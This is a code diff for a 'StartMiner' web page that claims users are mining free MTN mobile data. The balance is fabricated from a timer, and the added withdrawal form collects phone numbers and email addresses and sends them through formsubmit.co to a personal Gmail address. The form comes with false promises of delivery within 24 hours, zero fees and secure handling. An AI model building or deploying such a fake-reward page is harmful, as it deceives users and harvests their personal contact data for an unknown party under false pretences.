-      set("dDay",d); set("dHr",h); set("dMin",m); set("dSec",s);
-      set("wDay",d); set("wHr",h); set("wMin",m); set("wSec",s);
-
-      var bal = ((Math.max(0,now-START)/3600000)*RATE).toFixed(4);
-      set("dBal",bal); set("wBal",bal);
-
-      var total=TARGET-START, elapsed=Math.max(0,now-START);
-      var pct=Math.min(99.5,(elapsed/total)*100);
-      var f=document.getElementById("dFill"); if(f) f.style.width=pct+"%";
-      set("dPct", Math.floor(pct)+"%");
+      var elapsed = now - BASE;
+      var cycleElapsed = elapsed % CYCLE_TOTAL;
+      var cycleStart = now - cycleElapsed;
+      if(cycleElapsed < CYCLE_LOCK_MS){
+        return {
+          phase: "locked",
+          timeLeft: CYCLE_LOCK_MS - cycleElapsed,
+          cycleStart: cycleStart
+        };
+      } else {
+        return {
+          phase: "open",
+          timeLeft: CYCLE_TOTAL - cycleElapsed,
+          cycleStart: cycleStart
+        };
+      }
     }
 
-    function set(id,val){ var el=document.getElementById(id); if(el) el.textContent=val; }
+    function getBalanceMB(cycleStart){
+      var elapsed = Math.max(0, Date.now() - cycleStart);
+      var clampedMs = Math.min(elapsed, CYCLE_LOCK_MS);
+      return clampedMs * RATE_MB_PER_MS;
+    }
 
-    setInterval(tick,1000); tick();
+    function formatData(mb){
+      if(mb >= 1000){
+        return { val: (mb/1000).toFixed(2), unit: "GB" };
+      }
+      return { val: mb.toFixed(0), unit: "MB" };
+    }
 
-    /* ---- AUTH ---- */
+    // ===== TICK =====
+    function tick(){
+      var state = getState();
+      var diff  = state.timeLeft;
+      var d=pad(diff/86400000), h=pad((diff/3600000)%24), m=pad((diff/60000)%60), s=pad((diff/1000)%60);
+
+      // Dashboard timer
+      set("dDay",d); set("dHr",h); set("dMin",m); set("dSec",s);
+
+      // Balance
+      var mb  = getBalanceMB(state.cycleStart);
+      var fmt = formatData(mb);
+      set("dBal", fmt.val); set("dUnit", fmt.unit);
+
+      // Progress
+      var pct = Math.min(99.5,(Math.min(Date.now()-state.cycleStart, CYCLE_LOCK_MS)/CYCLE_LOCK_MS)*100);
+      var f=document.getElementById("dFill"); if(f) f.style.width=pct+"%";
+      set("dPct", Math.floor(pct)+"%");
+
+      // Update button + timer label
+      var btn=document.getElementById("goWdBtn");
+      var icon=document.getElementById("goWdIcon");
+      var txt=document.getElementById("goWdText");
+      var label=document.getElementById("dashTimerLabel");
+      var tabWd1=document.getElementById("tabWd1");
+
+      if(state.phase==="locked"){
+        if(btn){ btn.className="go-wd-btn locked"; }
+        if(icon) icon.className="fas fa-lock";
+        if(txt)  txt.textContent="Withdrawal Locked — Tap to see details";
+        if(label) label.innerHTML='<i class="fas fa-hourglass-half"></i> Withdrawal Opens In';
+        if(tabWd1){ tabWd1.className="tab tab-wd"; }
+      } else {
+        if(btn){ btn.className="go-wd-btn unlocked"; }
+        if(icon) icon.className="fas fa-unlock";
+        if(txt)  txt.textContent="🎉 Withdrawal OPEN — Claim Your MTN Data!";
+        if(label) label.innerHTML='<i class="fas fa-clock" style="color:var(--green)"></i> <span style="color:var(--green)">Withdrawal Closes In</span>';
+        if(tabWd1){ tabWd1.className="tab tab-wd open-tab"; }
+      }
+
+      // Update withdraw page if visible
+      renderWithdrawPage(state, mb, fmt, d, h, m, s);
+    }
+
+    // ===== RENDER WITHDRAW PAGE =====
+    function renderWithdrawPage(state, mb, fmt, d, h, m, s){
+      var body = document.getElementById("withdrawBody");
+      if(!body) return;
+      if(!body._rendered || body._phase !== state.phase) {
+        body._phase = state.phase;
+        body._rendered = true;
+        body.innerHTML = state.phase === "locked" ? lockedHTML() : openHTML();
+      }
+
+      if(state.phase === "locked"){
+        set("wBal", fmt.val);
+        set("wBalUnit", fmt.unit);
+        set("wDay",d); set("wHr",h); set("wMin",m); set("wSec",s);
+      } else {
+        set("woBal", fmt.val);
+        set("woBalUnit", fmt.unit);
+        var closeTime = state.timeLeft;
+        set("cDay",pad(closeTime/86400000));
+        set("cHr", pad((closeTime/3600000)%24));
+        set("cMin",pad((closeTime/60000)%60));
+        set("cSec",pad((closeTime/1000)%60));
+      }
+    }
+
+    function lockedHTML(){
+      return `
+      <div class="lock-card">
+        <div class="lock-icon"><i class="fas fa-lock"></i></div>
+        <div class="lock-title">Withdrawal Locked</div>
+        <div class="lock-sub">Keep mining! Your MTN Data is building up.<br>Withdrawal opens when the countdown reaches zero.</div>
+        <div class="bal-box">
+          <div class="bb-lbl"><i class="fas fa-wifi" style="color:var(--gold);margin-right:5px"></i> Your Current MTN Data Balance</div>
+          <div><span class="bb-val" id="wBal">0</span><span class="bb-unit" id="wBalUnit">MB</span></div>
+          <div class="bb-note">This data will be yours to claim when withdrawal opens</div>
+        </div>
+        <div class="card-lbl" style="justify-content:center;margin-bottom:8px"><i class="fas fa-hourglass-half"></i> Opens In</div>
+        <div class="w-timer-row">
+          <div class="wt-box"><div class="wt-num" id="wDay">00</div><div class="wt-lbl">Days</div></div>
+          <div class="wt-box"><div class="wt-num" id="wHr">00</div><div class="wt-lbl">Hours</div></div>
+          <div class="wt-box"><div class="wt-num" id="wMin">00</div><div class="wt-lbl">Mins</div></div>
+          <div class="wt-box"><div class="wt-num" id="wSec">00</div><div class="wt-lbl">Secs</div></div>
+        </div>
+        <div class="feat-list">
+          <div class="feat-item"><i class="fas fa-check-circle"></i> Withdraw MTN Data directly to your phone</div>
+          <div class="feat-item"><i class="fas fa-check-circle"></i> Minimum withdrawal: 100 MB</div>
+          <div class="feat-item"><i class="fas fa-check-circle"></i> Delivered within 24 hours of claim</div>
+          <div class="feat-item"><i class="fas fa-check-circle"></i> Zero fees — 100% free</div>
+        </div>
+      </div>`;
+    }
+
+    function openHTML(){
+      var hasClaimed = localStorage.getItem("sm_claimed_"+currentUser);
+      if(hasClaimed){
+        return `
+        <div class="success-card">
+          <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+          <div class="success-title">Request Submitted!</div>
+          <div class="success-sub">Your MTN Data withdrawal request has been received.<br><br>
+          We will send your data to your phone number within 24 hours.<br><br>
+          <strong style="color:var(--gold)">The next withdrawal window opens in 30 days.</strong></div>
+        </div>`;
+      }
+      return `
+      <div class="open-card">
+        <div class="open-header">
+          <div class="open-icon"><i class="fas fa-unlock"></i></div>
+          <div class="open-title">🎉 Withdrawal Open!</div>
+          <div class="open-sub">Enter your details below to receive your MTN Data. This window closes in:</div>
+        </div>
+        <div class="close-timer">
+          <i class="fas fa-clock"></i>
+          Closes in: <strong id="cDay">00</strong>d <strong id="cHr">00</strong>h <strong id="cMin">00</strong>m <strong id="cSec">00</strong>s
+        </div>
+        <div class="balance-display">
+          <div class="bd-lbl"><i class="fas fa-wifi" style="color:var(--gold);margin-right:5px"></i> Your MTN Data to Receive</div>
+          <div><span class="bd-val" id="woBal">0</span><span class="bd-unit" id="woBalUnit">MB</span></div>
+          <div class="bd-note">This is your full accumulated balance for this cycle</div>
+        </div>
+        <div class="form-title"><i class="fas fa-paper-plane"></i> Enter Your Details</div>
+        <div class="input-group">
+          <label>MTN Phone Number</label>
+          <input type="tel" id="phoneInput" placeholder="e.g. 08012345678" maxlength="15">
+        </div>
+        <div class="input-group">
+          <label>Email Address</label>
+          <input type="email" id="emailInput" placeholder="your@email.com">
+        </div>
+        <div id="wdErr" class="err" style="margin-bottom:10px"></div>
+        <button class="btn-submit" id="submitBtn" onclick="submitWithdraw()">
+          <i class="fas fa-paper-plane"></i> Submit Withdrawal Request
+        </button>
+        <div class="form-note"><i class="fas fa-lock" style="color:var(--gold)"></i> Your details are sent securely. MTN Data will be sent to your number within 24 hours.</div>
+      </div>`;
+    }
+
+    // ===== SUBMIT WITHDRAWAL =====
+    window.submitWithdraw = async function(){
+      var phone = (document.getElementById("phoneInput")||{}).value||"";
+      var email = (document.getElementById("emailInput")||{}).value||"";
+      var errEl = document.getElementById("wdErr");
+      var btn   = document.getElementById("submitBtn");
+      phone = phone.trim(); email = email.trim();
+      if(!phone || phone.length < 7){ errEl.style.display="block"; errEl.textContent="Please enter a valid MTN phone number."; return; }
+      if(!email || !email.includes("@")){ errEl.style.display="block"; errEl.textContent="Please enter a valid email address."; return; }
+      errEl.style.display="none";
+      if(btn){ btn.disabled=true; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Sending...'; }
+
+      var state = getState();
+      var mb    = getBalanceMB(state.cycleStart);
+      var fmt   = formatData(mb);
+
+      try {
+        var formData = new FormData();
+        formData.append("_replyto",   email);
+        formData.append("_subject",   "StartMiner MTN Data Withdrawal Request");
+        formData.append("Username",   currentUser);
+        formData.append("Phone",      phone);
+        formData.append("Email",      email);
+        formData.append("Balance",    fmt.val + " " + fmt.unit + " MTN Data");
+        formData.append("Submitted",  new Date().toLocaleString());
+
+        var res = await fetch("https://formsubmit.co/ezehdivinelove@gmail.com", {
+          method: "POST",
+          body: formData
+        });
+
+        // Mark as claimed for this cycle
+        localStorage.setItem("sm_claimed_"+currentUser, Date.now().toString());
+        // Re-render success
+        var body = document.getElementById("withdrawBody");
+        if(body){ body._rendered=false; }
+        toast("Request sent! Data coming within 24hrs.");
+      } catch(e){
+        if(btn){ btn.disabled=false; btn.innerHTML='<i class="fas fa-paper-plane"></i> Submit Withdrawal Request'; }
+        if(errEl){ errEl.style.display="block"; errEl.textContent="Network error. Please check your connection and try again."; }
+      }
+    };
+
+    // ===== AUTH =====
     function applyUser(name){
+      currentUser = name;
       set("navUser",name); set("wNavUser",name); set("wName",name);
     }
 
     window.doLogin = function(){
       var val=(document.getElementById("uInput").value||"").trim();
-      var err=document.getElementById("errMsg");
-      if(!val||val.length<3){
-        err.style.display="block";
-        err.textContent="Username must be at least 3 characters.";
-        return;
-      }
-      if(!/^[a-zA-Z0-9_]+$/.test(val)){
-        err.style.display="block";
-        err.textContent="Only letters, numbers and underscore allowed.";
-        return;
-      }
+      var err=document.getElementById("loginErr");
+      if(!val||val.length<3){ err.style.display="block"; err.textContent="Username must be at least 3 characters."; return; }
+      if(!/^[a-zA-Z0-9_]+$/.test(val)){ err.style.display="block"; err.textContent="Only letters, numbers and underscore allowed."; return; }
       err.style.display="none";
       localStorage.setItem("sm_user",val);
       applyUser(val);
@@ -341,32 +553,56 @@
       showPage("login");
     };
 
-    /* ---- NAVIGATION ---- */
+    // ===== NAVIGATION =====
     window.showPage = function(page){
-      document.getElementById("loginPage").classList.remove("active");
-      document.getElementById("dashPage").classList.remove("active");
-      document.getElementById("withdrawPage").classList.remove("active");
+      ["loginPage","dashPage","withdrawPage"].forEach(function(id){
+        document.getElementById(id).classList.remove("active");
+      });
       if(page==="dash") document.getElementById("dashPage").classList.add("active");
-      else if(page==="withdraw") document.getElementById("withdrawPage").classList.add("active");
+      else if(page==="withdraw"){
+        var body=document.getElementById("withdrawBody");
+        if(body) body._rendered=false; // force re-render on visit
+        document.getElementById("withdrawPage").classList.add("active");
+      }
       else document.getElementById("loginPage").classList.add("active");
       window.scrollTo(0,0);
+      tick();
     };
 
-    /* ---- TOAST ---- */
+    // ===== TOAST =====
     window.toast = function(msg){
+      set("toastMsg",msg||"Done!");
       var t=document.getElementById("toast");
-      set("toastMsg", msg||"Done!");
       t.classList.add("show");
       clearTimeout(window._tt);
-      window._tt=setTimeout(function(){ t.classList.remove("show"); },3500);
+      window._tt=setTimeout(function(){ t.classList.remove("show"); },4000);
     };
 
-    /* Enter key on login */
+    // ===== CLAIMED RESET =====
+    // Clear claimed flag when a new withdrawal cycle opens
+    function checkClaimReset(){
+      var saved = localStorage.getItem("sm_claimed_"+currentUser);
+      if(!saved) return;
+      var state = getState();
+      // If the claim was made before the current cycle opened, clear it
+      var cycleOpenedAt = Date.now() - (Date.now() - BASE) % CYCLE_TOTAL - (Date.now() - BASE) % CYCLE_TOTAL % CYCLE_TOTAL;
+      // Simpler: if claim timestamp < current cycle start, reset
+      var elapsed = Date.now() - BASE;
+      var cycleStart = Date.now() - (elapsed % CYCLE_TOTAL);
+      if(parseInt(saved) < cycleStart){
+        localStorage.removeItem("sm_claimed_"+currentUser);
+      }
+    }
+
     document.getElementById("uInput").addEventListener("keydown",function(e){ if(e.key==="Enter") doLogin(); });
 
-    /* Auto-login if saved */
+    // Auto-login
     var saved=localStorage.getItem("sm_user");
     if(saved){ applyUser(saved); showPage("dash"); }
+
+    setInterval(tick,1000);
+    setInterval(checkClaimReset, 60000);
+    tick();
   })();
   </script>
   </body>
